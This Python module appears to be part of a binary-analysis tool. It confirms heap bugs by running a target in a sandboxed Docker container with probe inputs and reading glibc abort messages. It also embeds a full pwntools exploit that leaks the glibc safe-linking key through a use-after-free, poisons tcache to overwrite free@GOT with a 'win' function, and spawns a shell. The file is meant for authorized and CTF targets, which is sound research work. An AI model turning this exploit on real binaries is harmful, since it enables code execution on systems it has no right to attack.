"""Dynamic heap-corruption confirmation.

Static heuristics (r2_heap) flag malloc/free patterns and UAF/double-free candidates; this
runs the target in the isolated sandbox with a few probe inputs and confirms a real heap bug
when glibc's allocator aborts (double free, corruption, invalid pointer, ...). For
AUTHORIZED / CTF targets."""
from __future__ import annotations

import os
import shutil
import subprocess

_ABORT = ("free(): ", "double free or corruption", "malloc(): ", "corrupted",
          "invalid pointer", "invalid next size", "smallbin double linked list",
          "unsorted double linked list", "munmap_chunk")

_PROBES = [b"\n", b"f\n", b"o" + b"A" * 200 + b"\n", b"1\n2\n3\n", b"A" * 300 + b"\n",
           b"free\n", b"0\n0\n", b"o\n"]


def autoheap(binary: str) -> dict:
    if not shutil.which("docker"):
        return {"ok": False, "note": "docker no disponible"}
    d = os.path.dirname(os.path.abspath(binary)); name = os.path.basename(binary)
    hits = []
    for probe in _PROBES:
        pf = os.path.join(d, ".heap_probe")
        with open(pf, "wb") as f:
            f.write(probe)
        try:
            r = subprocess.run(
                ["docker", "run", "--rm", "--platform", "linux/amd64", "--network", "none",
                 "--memory", "256m", "--pids-limit", "128", "-v", d + ":/w", "-w", "/w",
                 "gcc:13", "bash", "-c", f"chmod +x ./{name}; ./{name} < .heap_probe 2>&1 | head -12"],
                capture_output=True, text=True, timeout=30)
            out = (r.stdout + r.stderr)
        except subprocess.TimeoutExpired:
            out = ""
        finally:
            try: os.unlink(pf)
            except OSError: pass
        pat = next((p for p in _ABORT if p in out), None)
        if pat:
            kind = ("double-free" if "double free" in out or "free():" in out
                    else "heap-overflow/corruption")
            hits.append({"input": probe.decode("latin-1")[:24], "pattern": pat.strip(),
                         "kind": kind, "output": out.strip()[:300]})
    return {"ok": True, "confirmed": bool(hits), "hits": hits,
            "note": "corrupcion de heap confirmada por abort de glibc (sandbox)" if hits
                    else "no se disparo corrupcion con las entradas de prueba"}


# Heap-to-shell driver for the common menu-driven tcache-UAF shape (new/free/edit/show) with a
# gift `win` and a writable free@GOT (no-PIE / partial RELRO), e.g. the `heapexp` sample. It
# defeats glibc safe-linking WITHOUT needing exact heap offsets: freeing one chunk into an empty
# tcache bin sets its fd = mangle(NULL) = (&chunk >> 12), so `show` leaks that key directly;
# poisoning then uses fd = key ^ target. Runs in the binoracle-pwn sandbox (ASLR off).
_HEAP_SHELL_DRIVER = r'''
import sys
from pwn import *
elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
win = (elf.symbols or {}).get("win")
free_got = (elf.got or {}).get("free")
if not win or not free_got:
    print("NOT_APPLICABLE (no win / no free@GOT)"); sys.exit(1)
PROMPT = b"> "
def choose(io, c, idx=None, data=None):
    io.sendlineafter(PROMPT, str(c).encode())
    if idx is not None:
        io.sendline(str(idx).encode())     # menu reads the index on the next line (no prompt)
    if data is not None:
        io.send(data)
try:
    io = process([elf.path], aslr=False)
    # Phase A -- leak the safe-linking key: new(0); free(0) (empty bin -> fd=mangle(NULL));
    # show(0) returns (&0 >> 12); then take chunk 0 back so the bin is empty again.
    choose(io, 1, 0); choose(io, 2, 0)
    choose(io, 4, 0)
    key = u64(io.recv(8).ljust(8, b"\x00"))
    choose(io, 1, 0)                        # re-allocate index 0 (tcache empty, count 0)
    def drain(t=0.25):                      # EOF-tolerant read: captures any glibc abort text
        try: return io.recv(timeout=t)
        except Exception: return b""
    # Phase B -- poison, instrumented step by step so we see WHERE it dies and WHAT glibc says.
    stage = "start"; dbg = b""
    try:
        choose(io, 1, 1)                                            # new(1)
        choose(io, 2, 1); choose(io, 2, 0)                          # free(1); free(0) -> count 2
        choose(io, 3, 0, p64(key ^ free_got).ljust(0x20, b"\x00"))  # poison fd(0)=mangle(free_got)
        stage = "poisoned"; dbg += drain()
        choose(io, 1, 2); stage = "malloc1"; dbg += drain()         # malloc -> chunk 0
        choose(io, 1, 3); stage = "malloc2"; dbg += drain()         # malloc -> free@GOT
        choose(io, 3, 3, p64(win)); stage = "wrote_win"; dbg += drain()   # *free@GOT = win (8 bytes)
        io.sendlineafter(PROMPT, b"2"); io.sendline(b"2")           # free(2) -> free@GOT -> win()
        stage = "triggered"; dbg += io.recvrepeat(1.5)
        io.sendline(b"echo BINORACLE_PWNED; id"); dbg += io.recvrepeat(1.5)
    except Exception as e:
        dbg += ("[EOF@%s:%r]" % (stage, str(e))).encode()
    try: io.close()
    except Exception: pass
    ok = b"BINORACLE_PWNED" in dbg or b"win reached" in dbg or b"uid=" in dbg
    if ok:
        print("VERIFIED key=%#x free_got=%#x win=%#x" % (key, free_got, win))
    else:
        tail = dbg[-320:].decode("latin-1", "replace").replace("\n", " | ")
        print("NOT_VERIFIED key=%#x free_got=%#x win=%#x stage=%s dbg=%r"
              % (key, free_got, win, stage, tail))
except Exception as e:
    print("ERROR", repr(str(e)))
    sys.exit(1)
'''


def _heap_shell_applicable(binary: str) -> bool:
    """Cheap ELF pre-check (no container): the tcache-UAF->free@GOT->win exploit needs a `win`
    symbol and a `free` symbol. If pyelftools is missing we cannot tell, so we let the driver
    decide; if present and neither is found, skip the (costly) sandbox run entirely."""
    try:
        from elftools.elf.elffile import ELFFile
    except Exception:
        return True
    try:
        names = set()
        with open(binary, "rb") as f:
            elf = ELFFile(f)
            for sec in elf.iter_sections():
                if sec.name in (".symtab", ".dynsym"):
                    for s in sec.iter_symbols():
                        if s.name:
                            names.add(s.name)
        return "win" in names and any("free" in n for n in names)
    except Exception:
        return True


def autoheap_shell(binary: str) -> dict:
    """Drive a menu tcache-UAF (heapexp shape) to a verified shell via tcache poisoning +
    free@GOT overwrite. Needs a `win` and a writable free@GOT (no-PIE). Runs in the
    binoracle-pwn sandbox; degrades cleanly if Docker or the image is absent."""
    if not shutil.which("docker"):
        return {"ok": False, "note": "docker no disponible"}
    if not _heap_shell_applicable(binary):
        return {"ok": False, "note": "no aplicable (sin win/free): heap->shell requiere win + free@GOT"}
    try:
        img = subprocess.run(["docker", "image", "inspect", "binoracle-pwn"],
                             capture_output=True, timeout=15).returncode
    except subprocess.TimeoutExpired:
        return {"ok": False, "note": "docker no responde (image inspect timeout)"}
    if img != 0:
        return {"ok": False, "note": "falta la imagen 'binoracle-pwn' (make pwn-image)"}
    d = os.path.dirname(os.path.abspath(binary)); name = os.path.basename(binary)
    if not os.path.isdir(d):
        return {"ok": False, "note": f"directorio inexistente: {d}"}
    drv = os.path.join(d, ".binoracle_heap.py")
    try:
        with open(drv, "w") as f:
            f.write(_HEAP_SHELL_DRIVER)
    except OSError as e:
        return {"ok": False, "note": f"no se pudo escribir el driver: {e}"}
    try:
        r = subprocess.run(
            ["docker", "run", "--rm", "--platform", "linux/amd64", "--network", "none",
             "--memory", "512m", "--pids-limit", "256", "--security-opt", "seccomp=unconfined",
             "-v", d + ":/w", "-w", "/w", "binoracle-pwn", "bash", "-c",
             f"chmod +x ./{name}; python3 .binoracle_heap.py {name}"],
            capture_output=True, text=True, timeout=200)
        out = r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        out = "[timeout]"
    finally:
        try: os.unlink(drv)
        except OSError: pass
    verified = "VERIFIED" in out and "NOT_VERIFIED" not in out
    line = next((l for l in out.splitlines() if l.startswith("VERIFIED")), "")
    return {"ok": True, "verified": verified, "detail": line, "output": out[-600:],
            "note": "tcache-UAF -> free@GOT=win -> shell (sandbox)" if verified
                    else "no verificado (revisa alineacion/glibc o formato del menu)"}


def render_heap(r: dict) -> str:
    out = ["## Heap dinamico (confirmacion por ejecucion)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- corrupcion confirmada: **{'SI' if r.get('confirmed') else 'no'}**")
    for h in r.get("hits", []):
        out.append(f"\n### {h['kind']}  (input {h['input']!r})")
        out.append(f"- glibc: `{h['pattern']}`")
        out.append("```\n" + h["output"] + "\n```")
    if not r.get("hits"):
        out.append("- " + r.get("note", ""))
    return "\n".join(out)
